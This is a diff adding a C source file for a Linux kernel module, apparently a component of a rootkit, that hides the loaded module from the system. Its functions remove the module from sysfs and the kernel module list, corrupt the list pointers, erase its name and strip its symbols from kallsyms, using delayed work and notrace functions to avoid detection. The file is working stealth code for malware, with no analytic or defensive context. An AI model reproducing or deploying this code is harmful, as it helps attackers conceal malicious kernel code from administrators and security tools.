@@ -1,0 +1,90 @@
+#include "../include/hide_module.h"
+
+#define MODULE_HIDE_DELAY_MS 200
+
+static struct ub_conceal_state hider_state = {0};
+static void module_hide_deferred_work(struct work_struct *work);
+static DECLARE_DELAYED_WORK(hide_work, module_hide_deferred_work);
+
+static void module_hide_deferred_work(struct work_struct *work)
+{
+    ub_module_conceal();
+}
+
+static void __remove_from_sysfs(struct module *mod)
+{
+    struct kobject *kobj = &mod->mkobj.kobj;
+
+    if (kobj && kobj->parent) {
+        kobject_del(kobj);
+        kobj->parent = NULL;
+        kobj->kset = NULL;
+
+        if (mod->holders_dir) {
+            kobject_put(mod->holders_dir);
+            mod->holders_dir = NULL;
+        }
+    }
+}
+
+static void __remove_from_module_list(struct module *mod)
+{
+    if (!list_empty(&mod->list)) {
+        list_del_init(&mod->list);
+
+        mod->list.prev = (struct list_head *)0x37373731;
+        mod->list.next = (struct list_head *)0x22373717;
+    }
+}
+
+static void __sanitize_module_info(struct module *mod)
+{
+    mod->sect_attrs = NULL;
+    memset(mod->name, 0, sizeof(mod->name));
+}
+
+static void __remove_symbols_from_kallsyms(struct module *mod)
+{
+    if (mod->kallsyms) {
+        mod->kallsyms->num_symtab = 0;
+        mod->kallsyms->symtab = NULL;
+        mod->kallsyms->strtab = NULL;
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
+        mod->kallsyms->typetab = NULL;
+#endif
+    }
+}
+
+notrace void ub_module_conceal(void)
+{
+    struct module *mod = THIS_MODULE;
+
+    if (hider_state.hidden)
+        return;
+
+    hider_state.saved_list_pos = mod->list.prev;
+    hider_state.saved_parent = mod->mkobj.kobj.parent;
+
+    __remove_from_sysfs(mod);
+    __remove_from_module_list(mod);
+    __sanitize_module_info(mod);
+    __remove_symbols_from_kallsyms(mod);
+
+    hider_state.hidden = true;
+}
+
+notrace void ub_module_conceal_deferred(void)
+{
+    if (!hider_state.hidden)
+        schedule_delayed_work(&hide_work, msecs_to_jiffies(MODULE_HIDE_DELAY_MS));
+}
+
+notrace void ub_module_conceal_cancel(void)
+{
+    cancel_delayed_work_sync(&hide_work);
+}
+
+notrace bool ub_module_is_concealed(void)
+{
+    return hider_state.hidden;
+}
